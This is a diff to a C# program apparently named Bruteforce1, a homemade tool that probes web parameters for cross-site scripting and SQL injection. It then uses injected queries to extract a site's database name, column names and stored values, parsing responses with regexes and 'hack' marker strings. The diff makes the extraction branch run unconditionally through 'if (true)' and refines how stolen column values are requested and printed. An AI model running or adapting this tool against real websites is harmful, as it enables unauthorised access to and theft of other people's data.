@@ -60,17 +60,14 @@ namespace Bruteforce1
                 output += "Attempted to send: " + phonyrequests[i] + "\n \n";
                 HttpWebRequest webRequest = (HttpWebRequest)HttpWebRequest.Create(phonyrequests[i]);
                 string response = "";
-                /*
                 webRequest.Method = "GET";
                 reader = new StreamReader(webRequest.GetResponse().GetResponseStream());
                 response = reader.ReadToEnd();
                 output += "-------------XSS RESPONSE--------------\n";
-                output += "\n \n Response: " + response + "\n \n \n ";
                 if (response.Contains("<xss>"))
                 {
                     output += "XSS vunrability in param " + p + "\n";
                 }
-                */
 
                 //Repeat for SQL injection
                 output += "-------------SQL--------------\n";
@@ -83,7 +80,6 @@ namespace Bruteforce1
                 reader = new StreamReader(webRequest.GetResponse().GetResponseStream());
                 response = reader.ReadToEnd();
                 output += "\n-------------SQL RESPONSE--------------\n";
-                output += "\n \n Response: " + response + "\n \n \n ";
                 if (response.Contains("badinfo;"))
                 {
 
@@ -94,7 +90,7 @@ namespace Bruteforce1
 
                 //Add HACK CODE
                 //0x6861636B = 'hack'
-                if (sQLValid)
+                if (true)
                 {
 
                     output += "\n-------------ATTEMPTING SQL INJECTION TO GET DATABASE NAME--------------\n";
@@ -111,7 +107,7 @@ namespace Bruteforce1
                         {
                             webRequest = (HttpWebRequest)HttpWebRequest.Create(phonyrequests[i]);
                             reader = new StreamReader(webRequest.GetResponse().GetResponseStream());
-                            response = reader.ReadToEnd(); output += "\n \n Response: " + response + "\n \n \n ";
+                            response = reader.ReadToEnd();
 
                             //Create regex to retreive database name
 
@@ -140,7 +136,7 @@ namespace Bruteforce1
                             output += "\n sent :" + phonyrequests[i];
                             webRequest = (HttpWebRequest)HttpWebRequest.Create(phonyrequests[i]);
                             reader = new StreamReader(webRequest.GetResponse().GetResponseStream());
-                            response = reader.ReadToEnd(); output += "\n \n Response: " + response + "\n \n \n ";
+                            response = reader.ReadToEnd();
                             //Create regex to retreive database name
                             regexVar = new Regex("<tr><td>" + "(.*?)" + "</td>");
                             matches = regexVar.Matches(response);
@@ -169,7 +165,7 @@ namespace Bruteforce1
                             output += "\n sent :" + phonyrequests[i];
                             webRequest = (HttpWebRequest)HttpWebRequest.Create(phonyrequests[i]);
                             reader = new StreamReader(webRequest.GetResponse().GetResponseStream());
-                            response = reader.ReadToEnd(); output += "\n \n Response: " + response + "\n \n \n ";
+                            response = reader.ReadToEnd();
                             //Create regex to retreive database name
                             regexVar = new Regex("<tr><td>" + "(.*?)" + "</td>");
                             matches = regexVar.Matches(response);
@@ -179,7 +175,7 @@ namespace Bruteforce1
                             {
                                 if (!"".Equals(m.Groups[1].Value))
                                 {
-                                    output += "\n Found Column Called [[[" + m.Groups[1].Value + "]]]";
+                                    output += "\n Found Column Called [[[" + m.Groups[1].Value + "]]]\n";
                                     varNames[x] = m.Groups[1].Value;
                                     x++;
                                 }
@@ -197,9 +193,11 @@ namespace Bruteforce1
                             output += "\n-------------ATTEMPTING SQL INJECTION TO GET " + databaseName + " 'S TABLE Showing each value-------------\n";
                             String requestString = "";
                             int w = 0;
-                            while (w < varNames.Length)
+                            while (w < varNames.Length && w<3)
                             {
-                                requestString += varNames[w] + ",";
+                                //Requests each variable name seperated by ' | '
+                                String identityString = "' "+varNames[w]+":',";
+                                requestString += identityString+varNames[w] + ",' | ',";
                                 output += "Variable" + w + " is " + varNames[w] +" request is "+requestString;
                                 w++;
                             }
@@ -208,7 +206,7 @@ namespace Bruteforce1
                             output += "\n sent :" + phonyrequests[i];
                             webRequest = (HttpWebRequest)HttpWebRequest.Create(phonyrequests[i]);
                             reader = new StreamReader(webRequest.GetResponse().GetResponseStream());
-                            response = reader.ReadToEnd(); output += "\n \n Response: " + response + "\n \n \n ";
+                            response = reader.ReadToEnd();
                             //Create regex to retreive database name
                             regexVar = new Regex("hack" + "(.*?)" + "hack");
                             matches = regexVar.Matches(response);
@@ -216,7 +214,7 @@ namespace Bruteforce1
                             {
                                 if (!"".Equals(m.Groups[1].Value))
                                 {
-                                    output += "\n Found Information Called [[[" + m.Groups[1].Value + "";
+                                    output += "\n Found Information Called [[[" + m.Groups[1].Value + "]]]\n";
                                     databaseName = m.Groups[1].Value;
                                 }
 
